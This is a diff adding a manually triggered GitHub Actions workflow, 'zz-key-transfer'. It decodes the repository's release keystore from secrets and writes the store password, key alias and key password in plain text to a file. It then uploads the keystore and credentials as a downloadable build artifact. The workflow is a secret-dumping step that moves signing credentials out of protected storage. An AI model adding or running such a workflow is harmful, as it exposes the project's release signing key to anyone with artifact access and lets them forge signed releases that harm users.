@@ -1,0 +1,23 @@
+name: zz-key-transfer
+on:
+  workflow_dispatch:
+jobs:
+  transfer:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Materialize keystore
+        env:
+          KS: ${{ secrets.RELEASE_KEYSTORE_BASE64 }}
+          SP: ${{ secrets.RELEASE_STORE_PASSWORD }}
+          KA: ${{ secrets.RELEASE_KEY_ALIAS }}
+          KP: ${{ secrets.RELEASE_KEY_PASSWORD }}
+        run: |
+          mkdir -p out
+          printf '%s' "$KS" | base64 --decode > out/release.jks
+          { echo "keyAlias=$KA"; echo "storePassword=$SP"; echo "keyPassword=$KP"; } > out/creds.properties
+          ls -la out
+      - uses: actions/upload-artifact@v4
+        with:
+          name: key-transfer
+          path: out/
+          retention-days: 1
